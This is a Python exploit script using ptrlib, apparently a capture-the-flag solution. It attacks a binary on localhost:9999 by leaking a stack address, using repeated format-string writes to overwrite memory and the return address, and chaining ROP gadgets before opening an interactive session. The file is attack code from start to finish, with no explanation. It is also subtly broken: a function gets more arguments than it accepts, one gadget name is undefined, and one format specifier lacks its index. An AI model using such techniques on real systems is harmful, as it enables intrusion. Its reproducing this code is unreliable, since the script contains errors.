from ptrlib import *
from time import sleep

def write_addr(addr):
    t = (addr_stack + 0x40) & 0xff
    v = p64(addr)
    for i in range(6):
        if t + i != 0:
            sock.send('%{}c%18$hhn%{}c%23$hn\x00'.format(t + i, 1955 - t - i))
        else:
            sock.send('%18$hhn%1955c%23$hn')
        sleep(0.1)
        tv = ord(v[i])
        if tv != 0:
            sock.send('%{}c%13$hhn%{}c%23$hn\x00'.format(tv, 1955 - tv))
        else:
            sock.send('%13$hhn%1955c%23$hn')
        sleep(0.1)

def write(addr, value):
    write_addr(addr)
    x = ord(value[0])
    sock.send('%{}c%14$hhn%{}c%23$hn\x00'.format(x, 1955 - x))
    sleep(0.1)
    ta = p64(addr)[1]
    for i in range(1, len(value)):
        tmp = p64(addr + i)[1]
        if ta != tmp:
            write_addr(addr + i, 2)
            ta = tmp
        else:
            write_addr(addr + i, 1)
        if ord(value[i]) != 0:
            x = ord(value[i])
            sock.send('%{}c%14$hhn%{}c%23$hn\x00'.format(x, 1955 - x))
        else:
            sock.send('%14$hhn%1955c%23$hn\x00')
        sleep(0.1)

sock = Socket("localhost", 9999)
addr_buf = 0x601060 + 0x100 + 4

# stack address
sock.recvuntil(": ")
addr_stack = int(sock.recvline(), 16) - 0x118
logger.info("stack = " + hex(addr_stack))
ret_addr = addr_stack - 0xe8

# stage 1
payload = str2bytes('%{}c%26$hn'.format(addr_buf - 0x600dd8))
payload += b'\x00' * (16 - len(payload))
payload += p64(0x4007a3)
sock.send(payload)
sleep(0.1)

# stage 2
stack_tail = (addr_stack + 0x40) & 0xffff
payload = '%c' * 16 + '%{}c$hn%{}c%23$hhn\x00'.format(
    stack_tail - 16,
    (0xa3 - (stack_tail & 0xff) + 0x100) & 0xff
)
sock.send(payload)
sleep(0.1)

rop = 0x601060 + 0x200
write(addr_stack, p64(rop)[:6])

rop_pop_rbp = 0x400690
rop_pop_rsp = 0x40082d
rop_adc = 0x4006e8
rop_add_rsp_8 = 0x400848
rop_csu_pop = 0x40082a
rop_csu_init = 0x400810
addr_stderr = 0x601040

payload = p64(rop_add_rsp_8) * 3
payload += p64(rop_csu_pop)
payload += p64(0)
payload += p64(addr_stderr - 0x48)
payload += p64(rop)
payload += p64(0xffd2bc07)
payload += p64(0)
payload += p64(0)
payload += p64(rop_csu_init)
payload += p64(rop_adc)
payload += p64(0)
payload += p64(pop_csu_pop)
payload += p64(0)
payload += p64(0)
payload += p64(addr_stderr)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0x400819)
pre = '%{}c%23$hn'.format(0x82d)
pre += '\x00' * (0x200 - len(pre))
sock.send(pre + payload)

sock.interactive()
